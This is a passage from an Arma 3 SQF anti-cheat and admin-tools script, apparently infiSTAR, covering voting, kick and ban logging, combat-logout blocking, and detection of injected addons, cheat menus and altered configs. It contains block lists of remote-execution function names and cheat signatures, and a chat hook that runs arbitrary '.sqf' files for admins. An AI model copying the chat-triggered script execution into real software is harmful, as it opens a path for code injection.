if(_xUID != '')then                                                {                                                      _oUIDs pushBack _xUID;                                                };                                          } forEach playableUnits;                                          for '_i' from 0 to (count VoteArray)-1 step 2 do                                          {                                                _cUID = VoteArray select _i;                                                _cVOTE = VoteArray select (_i+1);                                                if(_cUID in _oUIDs)then                                                {                                                      if(_cVOTE == 'DAY')then {_cntday = _cntday + 1;};                                                      if(_cVOTE == 'NIGHT')then {_cntnight = _cntnight + 1;};                                                };                                          };                                                                                    _txt = format['%1 of %2 Players voted. %3 for Day and %4 for Night.',_cntVoted,_cntAll,_cntday,_cntnight];                                          "+_massMessage+" = ['<t size=''0.55'' color=''#0B6121''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];                                          {(owner _x) publicVariableClient '"+_massMessage+"';} forEach playableUnits;                                                                                    _date = date;                                          _date set [3,11];                                          if(_cntnight > _cntday)then                                          {                                                _date set [3,23];                                          };                                          EPOCH_StaticDateTime = _date;                                          setDate _date;                                          VoteArray = [];                                          LastVoteGoneThrough = time;                                    }                                    else                                    {                                          _txt = format['%1 of %2 Players voted (/vote day or /vote night).',_cntVoted,_cntAll];                                          "+_massMessage+" = ['<t size=''0.55'' color=''#0B6121''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];                                          {(owner _x) publicVariableClient '"+_massMessage+"';} forEach playableUnits;                                    };                              };                        };                  }                  else                  {                        _txt = format['Wait %1s more until next day/night vote can be made!',round((TimeVoteCooldown + LastVoteGoneThrough) - time)];                        "+_massMessage+" = ['<t size=''0.55'' color=''#0B6121''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];                        {(owner _x) publicVariableClient '"+_massMessage+"';} forEach playableUnits;                  };            };            fnc_VoteTimeServer = compileFinal ([_fnc_VoteTimeServer] call fnc_CompilableString);            "; }; _A3AHstring = _A3AHstring + "            _FNC_AH120_KICKLOG = {                  _name = _this select 0;                  _puid = _this select 1;                  _what = _this select 2;                  if(_what == 'COMBATCHECK')exitWith                  {                        _inCombat = _this select 3;                        if(isNil'"+_inCombatArray+"') then {"+_inCombatArray+" = [];};                        _fid = "+_inCombatArray+" find _puid;                        if(_fid != -1) then                        {                              "+_inCombatArray+" set[(_fid+1),_inCombat];                        }                        else                        {                              "+_inCombatArray+" pushBack _puid;                              "+_inCombatArray+" pushBack _inCombat;                        };                  };                  if(isNil '_name')then {_name = '';};                  if(isNil '_puid')then {_puid = '';};                  if((_name != '')&&(_puid == ''))then                  {                        {                              if(!isNull _x)then                              {                                    if(alive _x)then                                    {                                          if(name _x == _name)then                                          {                                                _puid = getPlayerUID _x;                                                diag_log format['<infiSTAR.de> CLIENT NO UID - SERVER RESOLVED: %1(%2).. used playableUnits',_name,_puid];                                          };                                    };                              };                        } forEach playableUnits;                  };                  _mytime = call fnc_getserverTime;                  if(_what == 'TPLOG')exitWith                  {                        _name = _this select 0;                        _puid = _this select 1;                        _adminName = _this select 4;                        _adminPUID = _this select 5;                        _lastpos = _this select 6;                        _mapLP = mapGridPosition _lastpos;                        _curpos = _this select 7;                        _mapCP = mapGridPosition _curpos;                        _log = _mytime + format['%1(%2) | Teleported %3(%4) from %5(%6) to %7(%8)  (%9m)',_adminName,_adminPUID,_name,_puid,_lastpos,_mapLP,_curpos,_mapCP,round(_lastpos distance _curpos)];                        _log call FNC_A3_ADMINLOG;                        "; if(_enableIngameLogs)then { _A3AHstring = _A3AHstring + "                        "+_AH_AdmiLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';};} forEach playableUnits;                        "; }; _A3AHstring = _A3AHstring + "                  };                  "; if(_LVC)then { _A3AHstring = _A3AHstring + "                        if(_what == 'LVC')exitWith                        {                              _obj = _this select 3;                              _vehptype = _this select 4;                              if((!isNil '_obj') && (!isNil '_vehptype'))then                              {                                    _veh = vehicle _obj;                                    _stype = typeOf _veh;                                    _spos = getPos _veh;                                    if((_obj == _veh) && (_stype != _vehptype))then                                    {                                          _vehicles = _spos nearEntities ['AllVehicles',1000];                                          if!(_veh in _vehicles)then                                          {                                                "+_dellocveh+" = '';                                                (owner _obj) publicVariableClient '"+_dellocveh+"';                                                "+_dellocveh+" = nil;                                                _log = format['LocalVehicle: %1  @%2 || ServerVehicle: %3  @%4',_vehptype,mapGridPosition (_this select 5),_stype,mapGridPosition _spos];                                                [_name,_puid,'SLOG',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                                          };                                    };                              };                        };                  "; }; _A3AHstring = _A3AHstring + "                  "; if(_HDC)then { _A3AHstring = _A3AHstring + "                        if(_what == 'DLOG')exitWith                        {                              _obj = _this select 3;                              if(!isNull _obj)then                              {                                    _dmgobj = damage _obj;                                    if(_dmgobj != (_this select 4))then                                    {                                          _obj setDamage (_this select 4);                                          if((_this select 4) > 0.5)then                                          {                                                _log = _mytime + format['%1(%2) GOD-MODE | dmg object is %3 should be %4',_this select 5,_this select 6,_dmgobj,(_this select 4)];                                                diag_log ('<infiSTAR.de>HL-EXPERIMENTAL| '+_log+' (v0148)');                                          };                                    };                              };                        };                  "; }; _A3AHstring = _A3AHstring + "                  _admins = "+str _admins+";                  if(_what == 'VASP')then                  {                        _exitvasp = false;                        {                              _xpid = getPlayerUID _x;                              if(_xpid != '')then                              {                                    if(_name == name _x)then                                    {                                          if(_puid != _xpid)then                                          {                                                _what = 'BAN';                                                _puid = _xpid;                                                _exitvasp = true;                                          };                                    };                              };                              if(_exitvasp)exitWith {};                        } forEach playableUnits;                        if!(_puid in _admins)then {_what = 'BAN';};                  };                  _work = toString(_this select 3);                  _log = _mytime + format['%1(%2) | %3',_name,_puid,_work];                  if(_what in ['BAN','TMPBAN','HLOG'])exitWith                  {                        if(_what in ['BAN','TMPBAN'])then                        {                              _log = _mytime + format['%1(%2) BANNED | %3',_name,_puid,_work];                              if(_puid in _admins)then                              {                                    _adminlog = _mytime + format['%1(%2) ADMIN - would have been banned now!',_name,_puid];                                    _adminlog call FNC_A3_HACKLOG;                                    "+_AH_HackLogArrayRND+" pushBack _adminlog;                              }                              else                              {                                    if(isNil '"+_TMPBAN+"')then {"+_TMPBAN+" = [];} else {if(typeName "+_TMPBAN+" != 'ARRAY')then {"+_TMPBAN+" = [];};};                                    if!(_puid in "+_TMPBAN+")then                                    {                                          if(_what == 'BAN') then {[_puid,_name] call FNC_A3_infiSTARBAN;};                                          "+_TMPBAN+" pushBack _puid;                                          {if(getPlayerUID _x in "+str _admins+")then {(owner _x) publicVariableClient '"+_TMPBAN+"';};} forEach playableUnits;                                    };                                    [_name,_puid] spawn fnc_infiServerKick;                              };                        };                        _log call FNC_A3_HACKLOG;                        "; if(_enableIngameLogs)then { _A3AHstring = _A3AHstring + "                        "+_AH_HackLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_HackLogArrayRND+"';};} forEach playableUnits;                        "; }; _A3AHstring = _A3AHstring + "                  };                  if(_what == 'SLOG')exitWith                  {                        _log call FNC_A3_SURVEILLANCELOG;                        "; if(_enableIngameLogs)then { _A3AHstring = _A3AHstring + "                        "+_AH_SurvLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_SurvLogArrayRND+"';};} forEach playableUnits;                        "; }; _A3AHstring = _A3AHstring + "                  };                  "; if(_LogAdminActions)then { _A3AHstring = _A3AHstring + "                        if(_what == 'ALOG')exitWith                        {                              _log call FNC_A3_ADMINLOG;                              "; if(_enableIngameLogs)then { _A3AHstring = _A3AHstring + "                              "+_AH_AdmiLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';};} forEach playableUnits;                              "; }; _A3AHstring = _A3AHstring + "                        };                  "; }; _A3AHstring = _A3AHstring + "                  if(_what == 'AC')exitWith                  {                        if(_puid in _admins)then                        {                              if(_work == '!admin')then                              {                                    _locDevs = "+str _devs+";                                    if(_puid in "+_adminsA+")then                                    {                                          "+_adminsA+" = "+_adminsA+" - [_puid];infiSTAR_ADMINS = "+_adminsA+";                                                                                    "; if(_announce_adminstate_changed)then { _A3AHstring = _A3AHstring + "                                          _txt = format['%1 logged out as admin..',_name];                                          "+_massMessage+" = ['<t size=''0.5'' color=''#FF0040''>'+(_txt)+'</t>',-0.1,0.96 * safezoneH + safezoneY,10,0,0,3079];                                          {(owner _x) publicVariableClient '"+_massMessage+"';} forEach playableUnits;                                          "; }; _A3AHstring = _A3AHstring + "                                                                                    if(_puid in _locDevs)exitWith{};                                          _alog = _mytime + format['%1(%2) | is a normal player now.',_name,_puid];                                          _alog call FNC_A3_ADMINLOG;                                          "+_AH_AdmiLogArrayRND+" pushBack _alog;                                    }                                    else                                    {                                          "+_adminsA+" pushBack _puid;infiSTAR_ADMINS = "+_adminsA+";                                                                                    "; if(_announce_adminstate_changed)then { _A3AHstring = _A3AHstring + "                                          _txt = format['%1 logged in as admin!',_name];                                          "+_massMessage+" = ['<t size=''0.5'' color=''#0080FF''>'+(_txt)+'</t>',-0.1,0.96 * safezoneH + safezoneY,10,0,0,3079];                                          {(owner _x) publicVariableClient '"+_massMessage+"';} forEach playableUnits;                                          "; }; _A3AHstring = _A3AHstring + "                                                                                    if(_puid in _locDevs)exitWith{};                                          _alog = _mytime + format['%1(%2) | is an admin again.',_name,_puid];                                          _alog call FNC_A3_ADMINLOG;                                          "+_AH_AdmiLogArrayRND+" pushBack _alog;                                    };                                    publicVariable '"+_adminsA+"';                                    {                                          if((getPlayerUID _x) in _admins)then                                          {                                                "; if(_enableIngameLogs)then { _A3AHstring = _A3AHstring + "                                                (owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';                                                "; }; _A3AHstring = _A3AHstring + "                                                (owner _x) publicVariableClient 'infiSTAR_ADMINS';                                          };                                    } forEach playableUnits;                              };                        };                  };                  "; if(_VDN)then { _A3AHstring = _A3AHstring + "                  if(_what == 'VOTE')exitWith                  {                        if(_work in ['DAY','NIGHT'])exitWith                        {                              [_puid,_work] call fnc_VoteTimeServer;                        };                  };                  "; }; _A3AHstring = _A3AHstring + "            };            "+_FNC_AH120_KICKLOG+" = compileFinal ([_FNC_AH120_KICKLOG] call fnc_CompilableString);            _AH_MAIN_BLOCK = {                  "; if(_CPC)then { _A3AHstring = _A3AHstring + "                        [_name,_puid] spawn {                              _name = _this select 0;                              _puid = _this select 1;                              _server_Addons = "+str _server_Addons+";                              _cfg = configFile;                              _client_Addons = [];                              for '_i' from 0 to count (_cfg)-1 do                              {                                    _selected = _cfg select _i;                                    if(isClass _selected)then                                    {                                          _c = configName _selected;                                          _client_Addons pushBack _c;                                    };                              };                              _badAddons = ['life_server'];                              _foundBad = [];                              _foundVeryBad = [];                              {                                    if!(_x in _server_Addons)then                                    {                                          _foundBad pushBack _x;                                    };                                    if(_x in _badAddons)then                                    {                                          _foundVeryBad pushBack _x;                                    };                              } forEach _client_Addons;                              if(str _foundBad != '[]')then                              {                                    _log = format['BadAddons: %1',_foundBad];                                    [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                              };                              if(str _foundVeryBad != '[]')then                              {                                    _log = format['PBO-Injector: %1',_foundVeryBad];                                    [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                    [] spawn "+_AHKickOFF+";                              };                        };                  "; }else{ _A3AHstring = _A3AHstring + "                        [_name,_puid] spawn {                              _name = _this select 0;                              _puid = _this select 1;                              _cfg = configFile;                              _client_Addons = [];                              for '_i' from 0 to count (_cfg)-1 do                              {                                    _selected = _cfg select _i;                                    if(isClass _selected)then                                    {                                          _c = configName _selected;                                          _client_Addons pushBack _c;                                    };                              };                              _badAddons = ['life_server'];                              _foundVeryBad = [];                              {                                    if(_x in _badAddons)then                                    {                                          _foundVeryBad pushBack _x;                                    };                              } forEach _client_Addons;                              if(str _foundVeryBad != '[]')then                              {                                    _log = format['PBO-Injector: %1',_foundVeryBad];                                    [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                    [] spawn "+_AHKickOFF+";                              };                        };                  "; }; _A3AHstring = _A3AHstring + "                  if!(0 in "+_AH_RunCheckARRAY+")then                  {                        [_name,_puid,_admins] spawn {                              disableSerialization;                              _name = _this select 0;                              _puid = _this select 1;                              _admins = _this select 2;                              _wallgames = 0;                              _lastglitch = time;                              _49openedTimer = 0;                              _tmpObj = objNull;                              _inCombat = 0;                              while {1 == 1} do                              {                                    if(isNil '"+_inCombatTime+"') then {"+_inCombatTime+" = 0;};                                    _combatTime = round(time - "+_inCombatTime+");                                    if(_combatTime < 30) then                                    {                                          if(_inCombat == 0)then                                          {                                                _inCombat = 1;                                                [_name,_puid,'COMBATCHECK',_inCombat] call "+_AH120KICKLOG+";                                          };                                    }                                    else                                    {                                          if(_inCombat == 1)then                                          {                                                _inCombat = 0;                                                [_name,_puid,'COMBATCHECK',_inCombat] call "+_AH120KICKLOG+";                                          };                                    };                                    if!(_tmpObj isEqualTo (vehicle player)) then                                    {                                          _tmpObj = (vehicle player);                                          player removeAllEventHandlers 'Hit';                                          player removeAllEventHandlers 'FiredNear';                                          if(alive player) then                                          {                                                player addEventHandler ['Hit',{"+_inCombatTime+" = time}];                                                player addEventHandler ['FiredNear',{"+_inCombatTime+" = time}];                                          };                                    };                                    if(!alive player)then                                    {                                          "+_inCombatTime+" = 0;                                    };                                    if(typeName _puid != 'STRING')then                                    {                                          _log = format['PUID BROKEN: %1',_puid];                                          [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                          [] spawn "+_AHKickOFF+";                                    };                                    if(!isNull (findDisplay 49))then                                    {                                          if(_49openedTimer == 0)then {_49openedTimer = time;};                                          if(_combatTime < 30) then                                          {                                                ((findDisplay 49) displayCtrl 104) ctrlEnable false;                                                ((findDisplay 49) displayCtrl 104) ctrlSetText format['COMBAT TIME: %1',30-_combatTime];                                          }                                          else                                          {                                                _waitTime = time - _49openedTimer;                                                if(_waitTime < 10)then                                                {                                                      ((findDisplay 49) displayCtrl 104) ctrlEnable false;                                                      ((findDisplay 49) displayCtrl 104) ctrlSetText format['ABORT IN %1',10-_waitTime];                                                }                                                else                                                {                                                      ((findDisplay 49) displayCtrl 104) ctrlSetText 'Abort';                                                      ((findDisplay 49) displayCtrl 104) ctrlEnable true;                                                };                                          };                                                                                    {                                                _btn = (findDisplay 49) displayCtrl _x;                                                if(!isNull _btn)then                                                {                                                      _btn ctrlSetText "+str _ESCMNUTOP+";                                                      _btn ctrlEnable false;                                                      _btn buttonSetAction '';                                                      _btn ctrlCommit 0;                                                };                                          } forEach [16700,2];                                          ((findDisplay 49) displayCtrl 103) ctrlEnable false;                                          ((findDisplay 49) displayCtrl 103) ctrlSetText "+str _ESCMNUBOT+";                                          ((findDisplay 49) displayCtrl 122) ctrlEnable false;                                          ((findDisplay 49) displayCtrl 122) ctrlShow false;                                          ((findDisplay 49) displayCtrl 523) ctrlSetText format['%1',_name];                                          ((findDisplay 49) displayCtrl 109) ctrlSetText format['%2',_puid];                                                                                    "; if(!_BRIEFING_MSG)then { _A3AHstring = _A3AHstring + "                                                ((findDisplay 49) displayCtrl 120) ctrlSetText 'infiSTAR.de AntiHack & AdminsTools - [Author: infiSTAR, Contact: infiSTAR23@gmail.com]';                                          "; }; _A3AHstring = _A3AHstring + "                                    }                                    else                                    {                                          _49openedTimer = 0;                                    };                                    _display24 = findDisplay 24;                                    if(!isNull _display24)then {                                          _chat = _display24 displayCtrl 101;                                          _txt = ctrlText _chat;                                          if(_txt != '')then {                                                _txtArray = toArray _txt;                                                if((_txtArray select 0) in [44,36,37,38,92,124,194,176,45,95,60,62])then {_chat ctrlSetText '';};                                                _txt = toLower _txt;                                                if(_puid in _admins)then {                                                      if(_txt == '!admin')then                                                      {                                                            (_display24) closeDisplay 0;                                                            [_name,_puid,'AC',toArray(_txt)] call "+_AH120KICKLOG+";                                                            uiSleep 0.5;                                                            (findDisplay 46) closeDisplay 0;                                                      };                                                }                                                else                                                {                                                      if(_txt in [format['.ban %1',toLower _name],format['.ban %1 true',toLower _name],format['.ban %1 true;',toLower _name]])then                                                      {                                                            _log = format['BadCommand: %1',_txt];                                                            [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] spawn "+_AHKickOFF+";                                                      };                                                };                                                if(_txt in ['/killme','/suicide'])then {                                                      waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};                                                      {player setHitPointDamage [_x,1];} forEach ['HitBody','HitHead'];                                                };                                                if(_txt find '.sqf' > -1)then {                                                      waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};                                                      if(_puid in _admins)then                                                      {                                                            _log = format['BadText: %1 - Faked local UID!',_txt];                                                            [_name,_puid,'VASP',toArray(_log)] call "+_AH120KICKLOG+";                                                            [] execVM _txt;                                                            systemChat ('Run: '+_txt);                                                      }                                                      else                                                      {                                                            _filecontent = '/';                                                            if(!(32 in _txtArray)&&!(9 in _txtArray)) then                                                            {                                                                  _f = preprocessFileLineNumbers _txt;                                                                  if(_f != '')then {_filecontent = _f;};                                                            };                                                            _log = format['BadText: %1 [%2]',_filecontent];                                                            [_name,_puid,'SLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                      };                                                };                                                "; if(_VDN)then { _A3AHstring = _A3AHstring + "                                                      if(_txt in ['!vote day','/vote day','vote day','!day','/day'])then {                                                            waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};                                                            [_name,_puid,'VOTE',toArray 'DAY'] call "+_AH120KICKLOG+";                                                      };                                                      if(_txt in ['!vote night','/vote night','vote night','!night','/night'])then {                                                            waitUntil {(findDisplay 24) closeDisplay 0;isNull findDisplay 24};                                                            [_name,_puid,'VOTE',toArray 'NIGHT'] call "+_AH120KICKLOG+";                                                      };                                                "; }; _A3AHstring = _A3AHstring + "                                          };                                    };                                    "; if(_UAG)then { _A3AHstring = _A3AHstring + "                                          if(!isNull player) then                                          {                                                if(animationState player == 'amovpercmsprsnonwnondf_amovppnemstpsnonwnondnon')then                                                {                                                      _ct = cursorTarget;                                                      if(!isNull _ct)then                                                      {                                                            if((_ct isKindOf 'Constructions_static_F') && (_ct distance player < 4))then                                                            {                                                                  if(time - _lastglitch > 45)then {_wallgames = 0;};                                                                  _lastglitch = time;                                                                  player switchMove '';                                                                  player setVelocity [0,0,0];                                                                  if(_wallgames >= 2)then                                                                  {                                                                        player setHitPointDamage ['HitLegs',1];                                                                        _log = format['Anti-Glitch: %1 triggered %2 times @%3',typeOf _ct,_wallgames,mapGridPosition player];                                                                        [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                  };                                                                  if(_wallgames >= 3)then                                                                  {                                                                        {player setHitPointDamage [_x,1];} forEach ['HitBody','HitHead'];                                                                        _log = format['Anti-Glitch: %1 triggered %2 times @%3',typeOf _ct,_wallgames,mapGridPosition player];                                                                        [_name,_puid,'HLOG',toArray(_log)] call "+_AH120KICKLOG+";                                                                        _wallgames = 0;                                                                        [] spawn "+_AHKickOFF+";                                                                  };                                                                  _wallgames = _wallgames + 1;                                                                  _msg = 'NO GLITCHING';                                                                  hint _msg;                                                                  1 cutText [format ['%1',_msg],'WHITE IN'];                                                                  systemChat _msg;                                                                  uiSleep 0.3;                                                            };                                                      };                                                };                                          };                                    "; }; _A3AHstring = _A3AHstring + "                                    if((isNull (findDisplay 49)) && (isNull _display24))then                                    {                                          uiSleep 0.2;                                    };                              };                        };                        "; if(_HDC)then { _A3AHstring = _A3AHstring + "                              [_name,_puid,_admins] spawn {                                    _name = _this select 0;                                    _puid = _this select 1;                                    _admins = _this select 2;                                    while {1 == 1} do                                    {                                          {                                                if(!isNull _x)then                                                {                                                      if!(getPlayerUID _x in _admins)then                                                      {                                                            if(_x distance player < 350)then                                                            {                                                                  if((isPlayer _x) && {(str _x) != (str player)})then                                                                  {                                                                        _x removeAllEventhandlers 'HandleDamage';                                                                        _x addEventHandler                                                                        [                                                                              'HandleDamage',                                                                              {                                                                                    _unit = _this select 0;                                                                                    _damage = _this select 2;                                                                                    if((alive _unit)&&(alive player))then {[profileName,getPlayerUID player,'DLOG',_unit,_damage,name _unit,getPlayerUID _unit] call "+_AH120KICKLOG+";};                                                                                    _damage;                                                                              }                                                                        ];                                                                  };                                                            };                                                      };                                                };                                          } forEach playableUnits;                                          uiSleep 5;                                    };                              };                        "; }; _A3AHstring = _A3AHstring + "                        "+_AH_RunCheckARRAY+" pushBack 0;                  };                  if!(1 in "+_AH_RunCheckARRAY+")then                  {                        [_name,_puid] spawn {                              _name = _this select 0;                              _puid = _this select 1;                              _CEA1 = ["+str _CE1+","+str _CE2+","+str _CE3+","+str _CE4+","+str _CE5+","+str _CE6+","+str _CE7+","+str _CE8+"];                              _server_onLoadUnload1 = "+str _onLoadUnload1+";                              _server_onLoadUnload2 = "+str _onLoadUnload2+";                              _server_onLoadUnload3 = "+str _onLoadUnload3+";                              "; if(_USE_RESTART_TIMER)then { _A3AHstring = _A3AHstring + "                                    _restartTime = "+str _RESTART_TIME_IN_M+";                                    _msgTimes = "+str _SHOW_TIMER_IN_MIN+";                                    _msgFormat = '<t size=''0.70'' color=''#DA1700'' align=''right''>RESTART IN %1 MINS</t>';                              "; }; _A3AHstring = _A3AHstring + "                              while {1 == 1} do                              {                                    "; if(_MPF)then { _A3AHstring = _A3AHstring + "                                          'life_fnc_MP_packet' addPublicVariableEventHandler                                          {                                                _forward = true;                                                                                                _lcode = toLower(str _this);                                                {if((_lcode find (toLower _x)) != -1)exitWith {_forward = false;};} forEach [                                                      'DB_fnc_mresToArray','db_fnc_asynccall','life_fnc_netSetVar','waitUntil{(markerText',                                                      'BIS_fnc_dbg_reminder_value','BIS_fnc_dbg_reminder'                                                ];                                                                                                _m = missionNamespace getVariable (_this select 0);                                                if(!isNil '_m')then                                                {                                                      _var = (_this select 0);                                                      _varLow = toLower (_this select 0);                                                      _varcontent = str _m;                                                      _varcontentLow = toLower _varcontent;                                                      {                                                            if(_varcontentLow find _x > -1)then                                                            {                                                                  _forward=false;                                                            };                                                      } forEach "+str _verybadStrings+";                                                };                                                                                                if(_forward)then                                                {                                                      [_this select 0,_this select 1] call life_fnc_MPexec;                                                };                                          };                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_USE_RESTART_TIMER)then { _A3AHstring = _A3AHstring + "                                          if((_restartTime - round(serverTime / 60)) in _msgTimes)then                                          {                                                [                                                      format[_msgFormat, _restartTime - round(serverTime / 60)],                                                      [safezoneX + safezoneW - 0.8,0.50],                                                      [safezoneY + safezoneH - 0.8,0.7],                                                      5,                                                      0.5                                                ] call BIS_fnc_dynamicText;                                          };                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_UCE)then { _A3AHstring = _A3AHstring + "                                          _CE1 = (getText(configFile >> 'RscDisplayOptionsVideo' >> 'controls' >> 'G_VideoOptionsControls' >> 'controls' >> 'HideAdvanced' >> 'OnButtonClick'));                                          _CE2 = (getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BCredits' >> 'OnButtonClick'));                                          _CE3 = (getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'ButtonCancel' >> 'OnButtonClick'));                                          _CE4 = (getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'ButtonCancel' >> 'action'));                                          _CE5 = (getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BGameOptions' >> 'action'));                                          _CE6 = (getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BConfigure' >> 'action'));                                          _CE7 = (getText(configFile >> 'RscDisplayMPInterrupt' >> 'controls' >>'ButtonAbort' >> 'action'));                                          _CE8 = (getText(configFile >> 'RscDisplayMPInterrupt' >> 'controls' >>'ButtonAbort' >> 'OnButtonClick'));                                          _CEA2 = [_CE1,_CE2,_CE3,_CE4,_CE5,_CE6,_CE7,_CE8];                                          for '_i' from 0 to (count _CEA1)-1 do                                          {                                                _a = _CEA1 select _i;                                                _a = _a - [32];                                                _a = _a - [9];                                                if(count _a > 120)then {_a resize 120;};                                                _bs = _CEA2 select _i;                                                _b = toArray _bs;                                                _b = _b - [32];                                                _b = _b - [9];                                                if(count _b > 120)then {_b resize 120;};                                                if!(_a isEqualTo _b)then                                                {                                                      _log = format['CheatEngine %1: %2',_i,_bs];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_UOL)then { _A3AHstring = _A3AHstring + "                                          uiSleep 1;                                          {                                                _onLoad = toArray(getText(configFile >> _x >> 'onLoad'));                                                _server_onLoad = _server_onLoadUnload2 select _forEachIndex;                                                if(!(_onLoad isEqualTo _server_onLoad) && !(_onLoad isEqualTo ''))then                                                {                                                      _log = format['onLoad changed: %1, %2, %3',_x,toString _onLoad,toString _server_onLoad];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                                _onUnload = toArray(getText(configFile >> _x >> 'onUnload'));                                                _server_onUnload = _server_onLoadUnload3 select _forEachIndex;                                                if(!(_onUnload isEqualTo _server_onUnload) && !(_onUnload isEqualTo ''))then                                                {                                                      _log = format['onUnload changed: %1, %2, %3',_x,toString _onUnload,toString _server_onUnload];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          } forEach _server_onLoadUnload1;                                    "; }; _A3AHstring = _A3AHstring + "                                    "; if(_UMP)then { _A3AHstring = _A3AHstring + "                                          uiSleep 1;                                          _children = [configFile >> 'RscDisplayMPInterrupt' >> 'controls',0] call BIS_fnc_returnChildren;                                          _allowedChildren = ['Title','MissionTitle','DifficultyTitle','PlayersName','ButtonCancel','ButtonSAVE','ButtonSkip','ButtonRespawn','ButtonOptions','ButtonVideo','ButtonAudio','ButtonControls','ButtonGame','ButtonTutorialHints','ButtonAbort','DebugConsole','Feedback','MessageBox','CBA_CREDITS_M_P','CBA_CREDITS_CONT_C','Version','TrafficLight','TraffLight'];                                          {                                                _cfgName = configName _x;                                                if(!(_cfgName in _allowedChildren))then                                                {                                                      _log = format['Modified MPInterrupt: %1 | %2',_x,_cfgName];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          } forEach _children;                                          "; }; _A3AHstring = _A3AHstring + "                                    uiSleep 1;                                    _cfg = configFile;                                    for '_i' from 0 to count (_cfg)-1 do                                    {                                          _selected = _cfg select _i;                                          if(isClass _selected)then                                          {                                                _c = configName _selected;                                                _lc = toLower _c;                                                if(_lc in ['pooploop','rscrazzler','rscListboxvg','vgdialog'])then                                                {                                                      _log = format['BadCFG: %1',_x];                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                      [] spawn "+_AHKickOFF+";                                                };                                          };                                    };                                    uiSleep 15;                              };                        };                        "+_AH_RunCheckARRAY+" pushBack 1;                  };                  _isNormal = true;                  if(_puid in _admins)then                  {                        _isNormal = false;                        if!(_puid in "+_adminsA+")then                        {                              _isNormal = true;                        };                  };                  if(_isNormal)then                  {                        if!(2 in "+_AH_RunCheckARRAY+")then                        {                              "; if(_CC2)then { _A3AHstring = _A3AHstring + "                                    [_name,_puid] spawn {                                          _name = _this select 0;                                          _puid = _this select 1;                                          disableSerialization;                                          _verybadStrings = "+str _verybadStrings+";                                          _excludeTxTArray = [];                                          _tmpexcludeTxTArray = [];{_tmpexcludeTxTArray pushBack (toLower _x);} forEach _excludeTxTArray;_excludeTxTArray = _tmpexcludeTxTArray;                                          _fnc_checkExcludedStrings = {                                                _state = true;                                                if(_excludeTxTArray isEqualTo [])exitWith {_state = true;};                                                {if(_this find _x > -1)exitWith {_state = false;};}      forEach _excludeTxTArray;                                                _state                                          };                                          _tempcountallDisplays = 0;                                          while {1 == 1} do                                          {                                                if!(_tempcountallDisplays isEqualTo (count allDisplays))then                                                {                                                      {                                                            _display = _x;                                                            _allCtrls = allControls _display;                                                            {                                                                  _control = _x;                                                                  _controltype = ctrlType _control;                                                                  if(_controltype isEqualTo 5)then                                                                  {                                                                        _size = lbSize _control;                                                                        if(_size > 0)then                                                                        {                                                                              for '_i' from 0 to (_size-1) do                                                                              {                                                                                    _lbtxt = _control lbText _i;                                                                                    _lowerlbtxt = toLower _lbtxt;                                                                                    if(_lowerlbtxt call _fnc_checkExcludedStrings)then                                                                                    {                                                                                          {                                                                                                if(_lowerlbtxt find _x > -1)then                                                                                                {                                                                                                      _log = format['BadlbText: %1 on %2 %3   (set _CC2 = false; in run.sqf if this bothers you.)',_lbtxt,_display,_control];                                                                                                      [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                                      [] spawn "+_AHKickOFF+";                                                                                                };                                                                                          } forEach _verybadStrings;                                                                                    };                                                                              };                                                                        };                                                                  }                                                                  else                                                                  {                                                                        if!(_controltype in [0,3,4,8,9,15,42,81,102])then                                                                        {                                                                              _ctrlTxt = ctrlText _control;                                                                              _lowerctrlTxt = toLower _ctrlTxt;                                                                              if(_lowerctrlTxt call _fnc_checkExcludedStrings)then                                                                              {                                                                                    {                                                                                          if(_lowerctrlTxt find _x > -1)then                                                                                          {                                                                                                _log = format['BadCtrlText: %1 on %2 %3   (set _CC2 = false; in run.sqf if this bothers you.)',_ctrlTxt,_display,_control];                                                                                                [_name,_puid,'BAN',toArray(_log)] call "+_AH120KICKLOG+";                                                                                                